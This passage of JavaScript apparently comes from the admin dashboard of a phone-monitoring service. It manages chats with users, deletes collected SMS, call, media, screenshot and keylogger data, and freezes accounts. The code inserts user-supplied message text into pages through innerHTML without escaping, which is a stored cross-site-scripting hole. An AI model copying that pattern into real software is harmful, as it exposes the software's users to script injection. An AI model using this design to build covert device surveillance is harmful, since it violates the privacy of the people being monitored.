                    messagesArea.appendChild(bubble);
                });
                
                // Mark as read using the Latest Message Timestamp
                markChatAsRead(userId, childKey, latestTimestamp);
            } else {
                messagesArea.innerHTML = '<p style="text-align:center; color: var(--text-secondary);">No messages yet. Start the conversation!</p>';
            }
            messagesArea.scrollTop = messagesArea.scrollHeight;
        })
    };
    
    const sendAdminMessage = () => {
        const messageText = input.value.trim();
        if (!messageText) return;

        const newMessageRef = push(chatRef);
        set(newMessageRef, {
            sender: 'admin',
            text: messageText,
            timestamp: serverTimestamp()
        }).then(() => {
            input.value = '';
            // Mark as read after sending
            markChatAsRead(userId, childKey);
        }).catch(e => alert('Error sending message: ' + e.message));
    };

    sendBtn.addEventListener('click', sendAdminMessage);
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendAdminMessage();
        }
    });
}


// --- GLOBAL HELPERS & EVENT LISTENERS ---

// Global Command Sender
window.cmd = (p, d) => {
    // If it's the config path (or any path where we pass an object with true/false commands), we must UPDATE, not SET.
    // SET completely overwrites the existing node, removing important flags like isFrozen.
    if (typeof d === 'object' && !Array.isArray(d)) {
        return update(ref(db, p), d).then(() => alert('Command Sent!'));
    }
    return set(ref(db, p), d).then(() => alert('Command Sent!'));
};

// Global Click Listener (Close Modals & Clear Data)
document.addEventListener('click', e => {
    if(e.target.classList.contains('clear-btn')) {
        if(confirm("Delete All?")) {
             const path = e.target.dataset.path;
             detachListeners(); // SAFE DELETE: Stop listeners
             modalDataDisplayArea.innerHTML = '<div class="loader"></div><p style="text-align:center">Processing...</p>';
             
             remove(ref(db, path)).then(() => {
                 modalDataDisplayArea.innerHTML = '<div class="data-header"><p style="text-align:center; padding: 20px;">All records deleted successfully.</p></div>';
             }).catch(err => {
                 alert("Error: " + err.message);
                 // Optional: Retry or reload
                 modalDataDisplayArea.innerHTML = '<p style="text-align:center; color: red;">Delete Failed.</p>';
             });
        }
    }
    
    // Close Button Logic
    if(e.target.classList.contains('modal-close-btn')) {
        const openModalEl = e.target.closest('.modal-overlay');
        if (openModalEl) {
            // If it's the data modal and we are in the #view state, go back to trigger popstate
            if (openModalEl.id === 'data-modal' && location.hash === '#view') {
                history.back();
            } else {
                closeModal(openModalEl);
            }
        }
    }

    // Global Chat Button (Delegated Event for reliability)
    if (e.target.closest('#global-chat-btn')) {
        openGlobalChat();
    }

    // Sidebar Overlay Click (Close Sidebar)
    if (e.target === overlay) {
        sidebar.classList.remove('open');
        overlay.style.display = 'none';
    }
});

function openGlobalChat() {
    const modal = document.getElementById('global-chat-modal');
    if (modal) {
        openModal(modal);
        loadGlobalChatUsers(); // Now calling the real loader function
    }
}

function loadGlobalChatUsers() {
    const list = document.getElementById('chat-user-list');
    if (!list) return;

    list.innerHTML = '<div style="padding:20px; text-align:center;"><div class="loader"></div><br>Loading conversations...</div>';

    // Fetch all users to find those with chats
    get(ref(db, 'user')).then((snapshot) => {
        if (!snapshot.exists()) {
            list.innerHTML = '<div style="padding:20px; text-align:center;">No users found.</div>';
            return;
        }

        const users = snapshot.val();
        let chatUsers = [];

        // 1. Collect all users who have a 'chat' node
        Object.entries(users).forEach(([uid, children]) => {
            Object.entries(children).forEach(([childKey, data]) => {
                if (data.chat) {
                    // Find latest message execution
                    const msgs = Object.values(data.chat);
                    const lastMsg = msgs.sort((a,b) => b.timestamp - a.timestamp)[0]; // Newest first
                    
                    chatUsers.push({
                        uid: uid,
                        childKey: childKey,
                        name: (data.profile && data.profile.name) ? data.profile.name : childKey,
                        lastMessage: lastMsg ? lastMsg.text : 'No messages',
                        timestamp: lastMsg ? lastMsg.timestamp : 0,
                        sender: lastMsg ? lastMsg.sender : 'none'
                    });
                }
            });
        });

        // 2. Sort users by latest message time
        chatUsers.sort((a, b) => b.timestamp - a.timestamp);

        // 3. Render List
        if (chatUsers.length === 0) {
            list.innerHTML = '<div style="padding:20px; text-align:center; color:#888;">No active chats found.</div>';
            return;
        }

        list.innerHTML = '';
        chatUsers.forEach(u => {
            const isUserLast = u.sender === 'user';
            const statusDot = isUserLast ? '<span style="color:#e74c3c; font-size:10px;">● New</span>' : '';
            
            const div = document.createElement('div');
            div.className = 'chat-user-item';
            div.style.padding = '15px';
            div.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
            div.style.cursor = 'pointer';
            div.style.transition = 'background 0.2s';
            
            div.innerHTML = `
                <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
                    <span style="font-weight:600; color:#fff;">${u.name} ${statusDot}</span>
                    <span style="font-size:0.75rem; color:#888;">${formatTimestamp(u.timestamp)}</span>
                </div>
                <div style="font-size:0.85rem; color:#aaa; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">
                    ${u.sender === 'admin' ? 'You: ' : ''}${u.lastMessage}
                </div>
                <div style="font-size:0.75rem; color:#555; margin-top:4px;">ID: ${u.childKey}</div>
            `;

            div.onclick = () => {
                // Highlight active
                const allItems = list.querySelectorAll('.chat-user-item');
                allItems.forEach(i => i.style.background = 'transparent');
                div.style.background = 'rgba(255,255,255,0.1)';
                
                // Update Global Selection so current chat works
                selectedUserInfo.userId = u.uid;
                selectedUserInfo.childKey = u.childKey;
                selectedUserInfo.userName = u.name;
                
                // --- NEW: For Mobile View Toggle ---
                const chatBody = document.getElementById('chat-modal-body');
                if (chatBody) chatBody.classList.add('chat-active');
                // -----------------------------------

                loadChatForGlobalModal(u.uid, u.childKey, u.name);
            };
            
            list.appendChild(div);
        });

    }).catch(err => {
        console.error("Error loading chat list:", err);
        list.innerHTML = '<p style="color:red; text-align:center">Error loading list</p>';
    });
}

function loadChatForGlobalModal(uid, childKey, name) {
    const rightPanel = document.querySelector('#global-chat-modal .chat-main-area');
    if(!rightPanel) return;

    // Helper to switch back to list view safely
    window.closeChatView = function(e) {
        if(e) e.stopPropagation(); // Prevent bubbling
        const chatBody = document.getElementById('chat-modal-body');
        if(chatBody) chatBody.classList.remove('chat-active');
    };

    rightPanel.innerHTML = `
        <div id="global-chat-header" style="border-bottom: 1px solid rgba(255,255,255,0.1); padding: 10px; display:flex; align-items:center; gap: 10px; background: #1e293b;">
             <!-- Back Button for Mobile -->
             <button id="chat-back-btn" onclick="window.closeChatView(event)" style="background:none; border:none; color:white; font-size:1.2rem; cursor:pointer; padding:5px 15px 5px 5px;">
                <i class="fas fa-arrow-left"></i>
             </button>

             <div style="display:flex; flex-direction:column; flex:1; min-width:0;">
                <h3 style="margin:0; font-size: 1rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${name}</h3>
                <span style="font-size:0.75rem; opacity:0.7; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${childKey}</span>
             </div>
        </div>
        
        <div id="global-chat-messages" style="flex:1; overflow-y:auto; padding:10px; display:flex; flex-direction:column; gap:8px; background: #0f172a;"></div>
        
        <!-- Translation Tools (Mobile Optimized) -->
        <div style="background:#1e293b; padding:8px; border-top:1px solid rgba(255,255,255,0.1);">
            <!-- Tools Row -->
            <div style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom: 8px;">
                <div style="display:flex; align-items:center; background: rgba(255,255,255,0.05); border-radius: 4px; padding: 4px 8px;">
                   <i class="fas fa-microphone" style="font-size: 0.7rem; margin-right:4px; color:#aaa;"></i>
                   <select id="chat-mic-lang" style="background:transparent; color:#fff; border:none; font-size: 0.75rem; max-width: 80px; cursor: pointer;">
                       <option value="hi-IN" style="background:#222;">Hindi</option>
                       <option value="en-US" style="background:#222;">English</option>
                       <option value="gu-IN" style="background:#222;">Gujarati</option>
                   </select>
                </div>
                
                <div style="display:flex; align-items:center; background: rgba(255,255,255,0.05); border-radius: 4px; padding: 4px 8px; flex: 1;">
                   <input type="checkbox" id="chat-translate-toggle" checked style="margin-right:6px; cursor:pointer;">
                   <span style="font-size: 0.75rem; margin-right:4px; white-space: nowrap; color:#aaa;">To:</span>
                   <select id="chat-target-lang" style="background:transparent; color:#fff; border:none; font-size: 0.75rem; width: 100%; cursor: pointer;">
                       <option value="en" style="background:#222;">English</option>
                       <option value="hi" style="background:#222;">Hindi</option>
                       <option value="es" style="background:#222;">Spanish</option>
                       <option value="fr" style="background:#222;">French</option>
                   </select>
                </div>
            </div>

            <!-- Input Row -->
            <div style="display:flex; gap:8px; align-items: stretch;">
                 <button id="chat-mic-btn" style="width: 40px; background:rgba(255,255,255,0.1); border:none; border-radius:4px; cursor:pointer; color:white; flex-shrink: 0; display:flex; align-items:center; justify-content:center;" title="Speak">
                    <i class="fas fa-microphone"></i>
                 </button>
                 <input type="text" id="global-chat-input" placeholder="Message..." style="flex:1; padding:10px; border-radius:4px; border:none; background:rgba(255,255,255,0.1); color:white; min-width: 0; font-size: 0.9rem;">
                 <button id="global-chat-send" style="width: 45px; background:#3498db; color:white; border:none; border-radius:4px; cursor:pointer; font-weight: bold; flex-shrink: 0; display:flex; align-items:center; justify-content:center;">
                    <i class="fas fa-paper-plane"></i>
                 </button>
            </div>
            <span id="chat-status-text" style="color:#3498db; font-size:0.7rem; display: block; margin-top: 4px; min-height: 14px;"></span>
        </div>
    `;

    const msgs = document.getElementById('global-chat-messages');
    const inp = document.getElementById('global-chat-input');
    const send = document.getElementById('global-chat-send');
    const micBtn = document.getElementById('chat-mic-btn');
    const translateToggle = document.getElementById('chat-translate-toggle');
    const targetLangSelect = document.getElementById('chat-target-lang');
    const micLangSelect = document.getElementById('chat-mic-lang');
    const statusText = document.getElementById('chat-status-text');

    const chatPath = `user/${uid}/${childKey}/chat`;
    const r = ref(db, chatPath);

    onValue(r, (snap) => {
        msgs.innerHTML = '';
        if(snap.exists()) {
            const data = snap.val();
            const sorted = Object.values(data).sort((a,b) => a.timestamp - b.timestamp);
            
            sorted.forEach(m => {
                const div = document.createElement('div');
                div.style.padding = '8px 12px';
                div.style.borderRadius = '8px';
                div.style.maxWidth = '75%';
                div.style.wordBreak = 'break-word';
                div.style.marginBottom = '5px';
                
                if(m.sender === 'admin') {
                    div.style.alignSelf = 'flex-end';
                    div.style.background = '#3498db';
                    div.style.color = '#fff';
                    // Check if originalText exists (shows it was translated)
                    const extra = m.originalText ? `<div style="font-size:0.7em; opacity:0.8; border-top:1px solid rgba(255,255,255,0.2); margin-top:4px; padding-top:2px;">Orig: ${m.originalText}</div>` : '';
                    div.innerHTML = `${m.text} ${extra} <div style="font-size:0.65rem; opacity:0.6; text-align:right; margin-top:2px;">${formatTimestamp(m.timestamp)}</div>`;
                } else {
                    div.style.alignSelf = 'flex-start';
                    div.style.background = '#2c3e50';
                    div.style.color = '#eee';
                    div.innerHTML = `${m.text} <div style="font-size:0.65rem; opacity:0.6; margin-top:2px;">${formatTimestamp(m.timestamp)}</div>`;
                }
                msgs.appendChild(div);
            });
            msgs.scrollTop = msgs.scrollHeight;
        }
    });

    // Translation Function (Google GTX Free Endpoint)
    const translateText = async (text, targetLang) => {
        try {
            const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`;
            const res = await fetch(url);
            const json = await res.json();
            if(json && json[0] && json[0][0] && json[0][0][0]) {
                return json[0][0][0];
            }
            return text; 
        } catch (e) {
            console.error("Translation failed:", e);
            statusText.textContent = "Translation failed";
            setTimeout(() => statusText.textContent = "", 3000);
            return text;
        }
    };

    const sendFn = async () => {
        const txt = inp.value.trim();
        if(!txt) return;

        let finalConfig = {
            text: txt,
            originalText: null
        };

        if(translateToggle.checked) {
             const target = targetLangSelect.value;
             // Don't translate if languages match (simple check, imperfect but useful)
             // But 'auto' source makes it hard. We just translate.
             
             statusText.textContent = "Translating...";
             send.innerText = "...";
             send.disabled = true;
             
             const translated = await translateText(txt, target);
             
             if(translated !== txt) {
                 finalConfig.text = translated;
                 finalConfig.originalText = txt; // Store original for reference
             }
             
             statusText.textContent = "";
             send.innerText = "Send";
             send.disabled = false;
        }

        push(r, {
            sender: 'admin',
            text: finalConfig.text,
            originalText: finalConfig.originalText,
            timestamp: serverTimestamp()
        });
        inp.value = '';
    };

    send.onclick = sendFn;
    inp.onkeypress = (e) => { if(e.key === 'Enter') sendFn(); };

    // Voice to Text
    if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
        const recognition = new SpeechRecognition();
        recognition.continuous = false;
        recognition.interimResults = false;

        micBtn.onclick = () => {
             // Set Lang dynamically
             recognition.lang = micLangSelect.value;
             try { recognition.start(); } catch(e) { recognition.stop(); }
        };

        recognition.onstart = () => {
            micBtn.style.background = '#e74c3c';
            statusText.textContent = "Listening...";
        };

        recognition.onend = () => {
            micBtn.style.background = 'rgba(255,255,255,0.1)';
            statusText.textContent = "";
        };

        recognition.onresult = (event) => {
            const t = event.results[0][0].transcript;
            inp.value = t;
            // Auto-Send as requested
            sendFn();
        };
        
        recognition.onerror = (e) => {
            console.error("Speech error", e);
            micBtn.style.background = 'rgba(255,255,255,0.1)';
            statusText.textContent = "";
        };
    } else {
        micBtn.style.display = 'none';
        micLangSelect.parentElement.style.display = 'none';
    }
}

// Sidebar & Notifications
toggleSidebarBtn.onclick = () => dashboard.classList.toggle('sidebar-hidden');
menuBtn.onclick = () => { sidebar.classList.add('open'); overlay.style.display = 'block'; };


// Delete User
deleteUserBtn.onclick = () => {
    deleteUserInfo.textContent = "Remove " + selectedUserInfo.userName + "?";
    openModal(deleteUserModal);
};

// [NEW] Clear Device Data Button Logic
clearDeviceDataBtn.onclick = async () => {
    const { userId, childKey, userName, children } = selectedUserInfo;
    if (!userId) return;

    if(!confirm(`Are you sure you want to CLEAR DATA (Logs, Notifications, Media) for ${userName}? This cannot be undone.`)) {
        return;
    }

    const updates = {};
    const targets = (childKey === 'all') ? Object.keys(children || {}) : [childKey];

    targets.forEach(cKey => {
        // Skip metadata/profile if they appear in children list (should have been filtered but safety check)
        if(['profile', 'subscription'].includes(cKey)) return;

        const base = `user/${userId}/${cKey}`;
        // Add paths to clear
        updates[`${base}/User_Logs`] = null;
        updates[`${base}/notificationsMessages/data`] = null;
        updates[`${base}/photo/data`] = null;
        updates[`${base}/video/data`] = null;
        updates[`${base}/audio/data`] = null;
        updates[`${base}/Calls`] = null;
        updates[`${base}/sms/data`] = null; 
        updates[`${base}/chat`] = null; // Clear Chat History
    });

    try {
        await update(ref(db), updates);
        alert("Selected data cleared successfully!");
        // Refresh view if needed
        if (document.getElementById('data-modal').style.display === 'flex') {
            closeModal(document.getElementById('data-modal'));
        }
    } catch (e) {
        alert("Error clearing data: " + e.message);
    }
};

// Deleted Logs (Ghost Emails)
deletedLogsBtn.onclick = () => {
    openModal(deletedLogsModal);
    if (!deletedLogsListener) {
        deletedLogsListener = onValue(ref(db, 'Deleted_Auth_Bin'), (snap) => {
            deletedLogsTableBody.innerHTML = '';
            const data = snap.val();
            if (!data) {
                deletedLogsTableBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 1rem;">No deleted logs found.</td></tr>';
                return;
            }

            const logs = [];
            Object.keys(data).forEach(key => {
                logs.push({ key, ...data[key] });
            });
            logs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

            logs.forEach(item => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid #444';
                tr.innerHTML = `
                    <td style="padding: 8px;">${item.email || 'N/A'}</td>
                    <td style="padding: 8px; font-family: monospace;">${item.uid}</td>
                    <td style="padding: 8px;">${formatTimestamp(item.timestamp)}</td>
                    <td style="padding: 8px; text-align: right;">
                        <button class="header-btn" style="background: #e74c3c; border-color: #e74c3c; padding: 2px 8px; font-size: 0.8rem;">Remove</button>
                    </td>
                `;
                tr.querySelector('button').onclick = () => {
                    if (confirm(`Remove log for ${item.email}? Ensure you deleted it from Auth Console first.`)) {
                        remove(ref(db, `Deleted_Auth_Bin/${item.key}`));
                    }
                };
                deletedLogsTableBody.appendChild(tr);
            });
        });
    }
};

// Close Deleted Logs Modal
document.querySelector('#deleted-logs-modal .modal-close-btn').onclick = () => {
    closeModal(deletedLogsModal);
};
deletedLogsModal.onclick = (e) => {
    if (e.target === deletedLogsModal) closeModal(deletedLogsModal);
};

// --- NEW FEATURE: Clear All Free Users Data ---
if (clearAllFreeUsersBtn) {
    clearAllFreeUsersBtn.onclick = async () => {
        if (!confirm("⚠️ WARNING: This will delete USER LOGS and NOTIFICATIONS for ALL USERS who do NOT have an active subscription.\n\nPaid users will be skipped.\nThis action cannot be undone.\n\nAre you sure you want to proceed?")) {
            return;
        }

        const originalText = clearAllFreeUsersBtn.innerHTML;
        // Text-only update to preserve button layout
        const descSpan = clearAllFreeUsersBtn.querySelector('.desc');
        if(descSpan) {
            descSpan.innerText = 'Processing...';
            // Optional: Add a subtle pulse or color change via class if desired
            clearAllFreeUsersBtn.style.opacity = '0.7'; 
        } else {
            clearAllFreeUsersBtn.innerHTML = '<span style="font-size: 12px;">⏳</span>';
        }
        clearAllFreeUsersBtn.disabled = true;

        try {
            const userSnapshot = await get(ref(db, 'user'));
            if (!userSnapshot.exists()) {
                alert("No users found in database.");
                clearAllFreeUsersBtn.innerHTML = originalText;
                clearAllFreeUsersBtn.disabled = false;
                return;
            }

            const users = userSnapshot.val();
            const updates = {};
            let freeUsersCount = 0;
            let subscribedUsersCount = 0;
            let skippedUsersCount = 0; // Users with no children or other issues

            for (const uid of Object.keys(users)) {
                const userChildren = users[uid];
                if (!userChildren) {
                    skippedUsersCount++;
                    continue;
                }

                let hasSubscription = false;

                // 1. Check if ANY child of this user has a subscription
                Object.keys(userChildren).forEach(childKey => {
                    // Ignore metadata keys
                    if (childKey === 'profile' || childKey === 'subscription') {
                        // If 'subscription' exists at user level, check it (legacy/compatibility)
                        if (childKey === 'subscription') hasSubscription = true; 
                        return;
                    }
                    
                    const childData = userChildren[childKey];
                    // Check if child has subscription object
                    if (childData && childData.subscription) {
                        hasSubscription = true;
                    }
                });

                if (hasSubscription) {
                    subscribedUsersCount++;
                    continue; // SKIP this user completely
                }

                // 2. If no subscription found, mark Logs & Notifications for deletion for ALL children
                let markedForDeletion = false;
                Object.keys(userChildren).forEach(childKey => {
                    if (childKey === 'profile' || childKey === 'subscription') return;

                    // Construct paths
                    const base = `user/${uid}/${childKey}`;
                    updates[`${base}/User_Logs`] = null;
                    updates[`${base}/notificationsMessages/data`] = null;
                    markedForDeletion = true;
                });
                
                if (markedForDeletion) freeUsersCount++;
            }

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ Operation Successful!\n\n- Cleared data for: ${freeUsersCount} free users\n- Skipped (Protected): ${subscribedUsersCount} paid users`);
            } else {
                alert("Operation finished. No data needed clearing (or all users are subscribed).");
            }

        } catch (error) {
            console.error("Error clearing free user data:", error);
            alert("An error occurred: " + error.message);
        } finally {
            clearAllFreeUsersBtn.innerHTML = originalText;
            clearAllFreeUsersBtn.disabled = false;
        }
    };
}

// --- NEW FEATURE: Global Media Cleanup (Free Users) + Notification ---
if (cleanupMediaFreeUsersBtn) {
    cleanupMediaFreeUsersBtn.onclick = async () => {
        if (!confirm("⚠️ MEDIA CLEANUP: This will delete PHOTOS, VIDEOS, AUDIO, SCREENSHOTS, CALLS, SMS & LOGS for ALL FREE USERS.\n\nSubscribed users will be skipped.\nUsers will receive a notification that their storage limit was reached.\n\nThis cannot be undone. Proceed?")) {
            return;
        }

        const originalText = cleanupMediaFreeUsersBtn.innerHTML;
        const descSpan = cleanupMediaFreeUsersBtn.querySelector('.desc');
        if(descSpan) {
            descSpan.innerText = 'Cleaning Media...';
            cleanupMediaFreeUsersBtn.style.opacity = '0.7';
        } else {
             cleanupMediaFreeUsersBtn.innerHTML = '<span style="font-size: 12px;">⏳</span>';
        }
        cleanupMediaFreeUsersBtn.disabled = true;

        try {
            const userSnapshot = await get(ref(db, 'user'));
            if (!userSnapshot.exists()) {
                alert("No users found.");
                cleanupMediaFreeUsersBtn.innerHTML = originalText;
                cleanupMediaFreeUsersBtn.disabled = false;
                return;
            }

            const users = userSnapshot.val();
            const updates = {};
            let affectedUsersCount = 0;
            let protectedUsersCount = 0;

            for (const uid of Object.keys(users)) {
                const userChildren = users[uid];
                if (!userChildren) continue;

                let hasSubscription = false;

                // 1. Subscription Check
                Object.keys(userChildren).forEach(childKey => {
                    if (childKey === 'profile' || childKey === 'subscription') {
                        if (childKey === 'subscription') hasSubscription = true; 
                        return;
                    }
                    const childData = userChildren[childKey];
                    if (childData && childData.subscription) {
                        hasSubscription = true;
                    }
                });

                if (hasSubscription) {
                    protectedUsersCount++;
                    continue; // Skip paid users
                }

                // 2. Prepare Cleanup for Free User
                let userModified = false;
                Object.keys(userChildren).forEach(childKey => {
                    if (childKey === 'profile' || childKey === 'subscription') return;

                    const base = `user/${uid}/${childKey}`;
                    
                    // -- Clear DATA --
                    updates[`${base}/photo/data`] = null;
                    updates[`${base}/video/data`] = null;
                    updates[`${base}/audio/data`] = null;
                    updates[`${base}/Calls`] = null;
                    updates[`${base}/sms/data`] = null;
                    updates[`${base}/User_Logs`] = null;
                    updates[`${base}/notificationsMessages/data`] = null;
                    updates[`${base}/chat`] = null;
                    // -- New: Screenshots --
                    updates[`${base}/captureScreenshot`] = null;
                    updates[`${base}/screenshot`] = null;
                    updates[`${base}/screenshots`] = null;

                    // -- Skip LIVE Data --
                    // We simply DO NOT add Location or Status to 'updates', so they remain untouched.

                    // -- Send Notification --
                    const newNotifKey = push(ref(db, `${base}/adminNotifications`)).key;
                    updates[`${base}/adminNotifications/${newNotifKey}`] = {
                        title: "Storage Limit Reached",
                        message: "Your free plan storage limit has been exceeded. Historical media and logs have been cleared to free up space. Upgrade to Premium for unlimited history.",
                        timestamp: serverTimestamp(),
                        read: false
                    };
                    
                    userModified = true;
                });

                if (userModified) affectedUsersCount++;
            }

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ Media Cleanup Complete!\n\n- Cleared Data for: ${affectedUsersCount} Free Users\n- Notifications Sent: Yes\n- Protected (Paid): ${protectedUsersCount} Users`);
            } else {
                alert("No free users found or no data to clear.");
            }

        } catch (e) {
            console.error("Cleanup Error:", e);
            alert("Error during cleanup: " + e.message);
        } finally {
            cleanupMediaFreeUsersBtn.innerHTML = originalText;
            cleanupMediaFreeUsersBtn.disabled = false;
        }
    };
}

// ==========================================
// MANAGE LOCKS LOGIC
// ==========================================
if (manageLocksBtn) {
    manageLocksBtn.addEventListener('click', async () => {
        if (!selectedUserInfo.userId || selectedUserInfo.childKey === 'all') {
            alert("Please select a specific child first.");
            return;
        }

        // Reset Form
        lockUnlockDateInput.value = '';
        lockSmsCheckbox.checked = false;
        lockCallsCheckbox.checked = false;
        lockNotificationsCheckbox.checked = false;
        lockKeyloggerCheckbox.checked = false;

        // Open Modal
        openModal(manageLocksModal);

        // Fetch Current Locks
        try {
            const snapshot = await get(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/lockedFeatures`));
            if (snapshot.exists()) {
                const data = snapshot.val();
                
                if (data.sms && data.sms.isLocked) lockSmsCheckbox.checked = true;
                if (data.calls && data.calls.isLocked) lockCallsCheckbox.checked = true;
                if (data.notifications && data.notifications.isLocked) lockNotificationsCheckbox.checked = true;
                if (data.keylogger && data.keylogger.isLocked) lockKeyloggerCheckbox.checked = true;

                // Set Date (Take the max date found, or default empty)
                let maxTime = 0;
                if (data.sms && data.sms.unlockTime > maxTime) maxTime = data.sms.unlockTime;
                if (data.calls && data.calls.unlockTime > maxTime) maxTime = data.calls.unlockTime;
                if (data.notifications && data.notifications.unlockTime > maxTime) maxTime = data.notifications.unlockTime;
                if (data.keylogger && data.keylogger.unlockTime > maxTime) maxTime = data.keylogger.unlockTime;
                
                if (maxTime > 0) {
                    // Create a Date object from the timestamp (milliseconds)
                    const date = new Date(maxTime);
                    // Adjust to local time string for datetime-local input
                    // Format: YYYY-MM-DDTHH:mm
                    const year = date.getFullYear();
                    const month = String(date.getMonth() + 1).padStart(2, '0');
                    const day = String(date.getDate()).padStart(2, '0');
                    const hours = String(date.getHours()).padStart(2, '0');
                    const minutes = String(date.getMinutes()).padStart(2, '0');
                    lockUnlockDateInput.value = `${year}-${month}-${day}T${hours}:${minutes}`;
                }
            }
        } catch (error) {
            console.error("Error fetching locks:", error);
            alert("Failed to fetch current lock status.");
        }
    });
}

if (saveLocksBtn) {
    saveLocksBtn.addEventListener('click', async () => {
        if (!selectedUserInfo.userId || !selectedUserInfo.childKey) return;
        
        const unlockDateVal = lockUnlockDateInput.value;
        let unlockTime = 0;
        
        if (unlockDateVal) {
            unlockTime = new Date(unlockDateVal).getTime();
        } else {
             // If any box is checked, a date is required
            if (lockSmsCheckbox.checked || lockCallsCheckbox.checked || lockNotificationsCheckbox.checked || lockKeyloggerCheckbox.checked) {
                alert("Please select an Unlock Date & Time.");
                return;
            }
        }

        const updates = {};
        const basePath = `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/lockedFeatures`;

        // Helper to create lock object
        const createLockObj = (isChecked) => {
            if (isChecked) {
                    return { isLocked: true, unlockTime: unlockTime };
            } else {
                    return { isLocked: false, unlockTime: 0 };
            }
        };

        updates[`${basePath}/sms`] = createLockObj(lockSmsCheckbox.checked);
        updates[`${basePath}/calls`] = createLockObj(lockCallsCheckbox.checked);
        updates[`${basePath}/notifications`] = createLockObj(lockNotificationsCheckbox.checked);
        updates[`${basePath}/keylogger`] = createLockObj(lockKeyloggerCheckbox.checked);

        try {
            await update(ref(db), updates);
            alert("Feature locks updated successfully!");
                closeModal(manageLocksModal);
            } catch (error) {
                console.error("Error saving locks:", error);
                alert("Failed to update locks: " + error.message);
            }
        });
    }
    
    // Close Modal Logic
    if (manageLocksModal) {
        const closeBtn = manageLocksModal.querySelector('.modal-close-btn');
        if (closeBtn) closeBtn.onclick = () => closeModal(manageLocksModal);
        if (cancelLocksBtn) cancelLocksBtn.onclick = () => closeModal(manageLocksModal);
    }
    
// --- Email Verification Manager Logic ---
const refreshVerifBtn = document.getElementById('refresh-verification-list-btn');
if(refreshVerifBtn) refreshVerifBtn.onclick = loadUnverifiedUsersList;

const freezeAllBtn = document.getElementById('verification-freeze-all-btn');
if(freezeAllBtn) freezeAllBtn.onclick = () => bulkToggleFreeze(true);

const unfreezeAllBtn = document.getElementById('verification-unfreeze-all-btn');
if(unfreezeAllBtn) unfreezeAllBtn.onclick = () => bulkToggleFreeze(false);

let currentUnverifiedUsersCache = []; // Cache to store current list for bulk actions

async function sendVerificationNotification(uid, userData) {
    if(!confirm('Send verification reminder to this user?')) return;
    const updates = {};
    const timestamp = serverTimestamp();
    
    // Notify all devices
    Object.keys(userData).forEach(key => {
        if(key !== 'profile' && key !== 'subscription' && key !== 'adminNotifications') {
             const newNotifKey = push(ref(db, `user/${uid}/${key}/adminNotifications`)).key;
             updates[`user/${uid}/${key}/adminNotifications/${newNotifKey}`] = {
                title: "Action Required: Verify Email",
                message: "Please verify your email address immediately to avoid account suspension. Check your inbox or spam folder.",
                timestamp: timestamp,
                read: false,
                type: 'verification_reminder'
            };
        }
    });
    
    if(Object.keys(updates).length > 0) {
        await update(ref(db), updates);
        alert('Notification sent!');
    } else {
        alert('User has no active devices to notify or unexpected data structure.');
    }
}

async function bulkToggleFreeze(shouldFreeze) {
    if(currentUnverifiedUsersCache.length === 0) {
        alert("No consumers in current list.");
        return;
    }

    const actionText = shouldFreeze ? "FREEZE" : "UNFREEZE";
    const confirmMessage = shouldFreeze 
        ? `⚠️ CRITICAL: Are you sure you want to FREEZE ALL ${currentUnverifiedUsersCache.length} unverified users? They will lose access immediately.`
        : `Are you sure you want to UNFREEZE ALL ${currentUnverifiedUsersCache.length} users?`;

    if(!confirm(confirmMessage)) return;

    if(shouldFreeze) {
         // Second confirmation for Freeze All
         if(!confirm("⚠️ Double Check: This will impact multiple users. Proceed?")) return;
    }

    const updates = {};
    let affectedCount = 0;

    currentUnverifiedUsersCache.forEach(user => {
        const uid = user.uid;
        const userData = user.userData;
        
        // Skip if already in desired state (optional optimization, but good to force sync)
        if(shouldFreeze && user.isFrozen) return; // Already frozen
        if(!shouldFreeze && !user.isFrozen) return; // Already active

        affectedCount++;

        // 1. Profile Status
        updates[`user/${uid}/profile/accountStatus`] = shouldFreeze ? 'frozen' : 'active';
        if(shouldFreeze) updates[`user/${uid}/profile/freezeReason`] = 'email_verification_required';
        else updates[`user/${uid}/profile/freezeReason`] = null;

        // 2. Child Devices
        Object.keys(userData).forEach(key => {
            if(key !== 'profile' && key !== 'subscription' && key !== 'adminNotifications') {
                 updates[`user/${uid}/${key}/app_functioning/isFrozen`] = shouldFreeze;
                 if(shouldFreeze) {
                     // Send Freeze Notification
                     const newNotifKey = push(ref(db, `user/${uid}/${key}/adminNotifications`)).key;
                     updates[`user/${uid}/${key}/adminNotifications/${newNotifKey}`] = {
                        title: "Account Frozen",
                        message: "Your account is frozen due to unverified email. Dashboard access is restricted.",
                        timestamp: serverTimestamp(),
                        read: false,
                        type: 'account_frozen'
                    };
                 }
            }
        });
    });

    if(affectedCount === 0 && Object.keys(updates).length === 0) {
        alert("All users are already in the desired state.");
        return;
    }

    try {
        await update(ref(db), updates);
        alert(`✅ Successfully ${shouldFreeze ? 'FROZEN' : 'UNFROZEN'} ${affectedCount} users.`);
        loadUnverifiedUsersList(); // Refresh UI
    } catch(err) {
        console.error(err);
        alert("Error during bulk operation: " + err.message);
    }
}

async function toggleUserFreeze(uid, userData, shouldFreeze) {
    if(!confirm(shouldFreeze ? 'Freeze this user? They will lose access to the dashboard until verified.' : 'Unfreeze this user?')) return;
    
    const updates = {};
    // 1. Profile Status
    updates[`user/${uid}/profile/accountStatus`] = shouldFreeze ? 'frozen' : 'active';
    if(shouldFreeze) updates[`user/${uid}/profile/freezeReason`] = 'email_verification_required';
